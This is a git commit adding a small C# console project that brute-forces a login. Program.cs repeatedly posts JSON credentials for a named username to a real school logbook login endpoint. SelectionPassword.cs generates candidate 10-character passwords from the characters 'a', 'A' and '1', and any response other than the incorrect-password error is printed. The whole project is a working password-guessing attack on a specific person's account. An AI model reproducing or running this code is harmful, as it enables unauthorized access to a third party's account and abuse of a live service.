1ece9e2b82655c597176853a99694977d2a2d9e2
SIV220785 <SIV220785@gmail.com>
2019-09-24 19:20:00 +0300

    Добавьте файлы проекта.

---
+++ DemoJsomWebClient/Program.cs
@@ -0,0 +1,95 @@
+﻿using Newtonsoft.Json;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net.Http;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace DemoJsomWebClient
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            //string urlApiGet = @"http://www.nbrb.by/API/ExRates/Rates?Periodicity=0";
+
+            //HttpClient httpClient = new HttpClient();
+
+            //var task1 = httpClient.GetStringAsync(urlApiGet);
+
+            //task1.ContinueWith(p =>
+            //{
+            //    Console.WriteLine("GetStringAsync - Get All");
+
+            //    string json = p.Result.ToString();
+            //    Console.WriteLine($"JSON - {json}");
+            //    List<dynamic> orders = JsonConvert.DeserializeObject<List<dynamic>>(json);
+            //    Console.WriteLine($"Orders:");
+            //    foreach (var order in orders)
+            //    {
+            //        Console.WriteLine(order);
+            //    }
+            //});
+
+            HttpClient httpClient = new HttpClient();
+            SelectionPassword selectionPassword = new SelectionPassword();
+            string checkPassword = "";
+            bool isChack = true;
+            string urlPost = @"https://logbook.itstep.org/auth/login";
+            string status = @"{""error"":{""password"":[""Incorrect user name or password""]}}";
+            LoginMain loginForm = new LoginMain()
+            {
+                LoginForm = new Login()
+                {
+                    id_city = null,
+                    username = "kirillemko",
+                    password = checkPassword
+                }
+            };
+
+
+            while (isChack)
+            {
+                loginForm.LoginForm.password = checkPassword;
+                string jsonPost = JsonConvert.SerializeObject(loginForm);
+                StringContent stringContent = new StringContent(jsonPost, Encoding.UTF8, "application/json");
+                var task3 = httpClient.PostAsync(urlPost, stringContent);
+
+                task3.ContinueWith(p =>
+                            {
+                                selectionPassword.SelectionPass(ref checkPassword, ref isChack);
+                                HttpResponseMessage response = p.Result;
+                                response.EnsureSuccessStatusCode();
+                                response.Content.ReadAsStringAsync().ContinueWith(value =>
+                                {
+                                    Console.WriteLine(new string('-', 50));
+                                    Console.WriteLine("PostAsync");
+
+                                    Console.WriteLine($"{nameof(value.Result)} - {value.Result}");
+                                    Console.WriteLine(checkPassword);
+                                    if (!status.Equals(value.Result))
+                                    {
+                                        Console.WriteLine(checkPassword);
+                                    }
+                                });
+
+                            }).Wait();
+            }
+
+
+
+
+
+
+
+
+
+
+
+
+
+            Console.ReadKey();
+        }
+    }
+}
---
+++ DemoJsomWebClient/SelectionPassword.cs
@@ -0,0 +1,103 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace DemoJsomWebClient
+{
+    public class SelectionPassword
+    {
+        List<char> _tempPassword;
+        List<char> _lettes;
+        List<int> _count;
+        string _exitConditions;
+
+        public SelectionPassword()
+        {
+            _tempPassword = new List<char>() { 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a' };
+            _lettes = new List<char>() { 'a', 'A', '1' };
+            _count = new List<int>() { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
+            _exitConditions = "1111111111";
+
+        }
+
+        public void SelectionPass(ref string password, ref bool isCheck)
+        {
+
+            if (password.Equals(_exitConditions))
+            {
+                isCheck = false;
+            }
+
+            for (int i = _count.Count() - 1; i > -1; i--)
+            {
+
+                for (int j = 0; j < 3; j++)
+                {
+                    if (_count[i] == j)
+                    {
+                        ++_count[i];
+
+                        break;
+                    }
+                }
+
+                if (_count[i] == 3)
+                {
+                    ++_count[i - 1];
+                    _count[i] = 0;
+                    break;
+                }
+
+                if (_count[i] != 0)
+                {
+                    break;
+                }
+            }
+
+            for (int i = _count.Count() - 1; i > -1; i--)
+            {
+                if (_count[i] == 3)
+                {
+                    if (_count[0] == 3)
+                    {
+                        isCheck = false;
+                        return;
+                    }
+                    _count[i] = 0;
+                    ++_count[i - 1];
+                    _tempPassword[i] = _lettes[_count[i]];
+                }
+            }
+
+            var temp = "";
+            foreach (var item in _count)
+            {
+                temp += item;
+            }
+
+            try
+            {
+                for (int i = 0; i < _tempPassword.Count(); i++)
+                {
+                    _tempPassword[i] = _lettes[_count[i]];
+                }
+            }
+            catch (Exception x)
+            {
+                Console.WriteLine(x.Message);
+            }
+            
+
+            var tempPas = "";
+
+            foreach (var item in _tempPassword)
+            {
+                tempPas += item;
+            }
+            password = tempPas;
+
+        }
+    }
+}
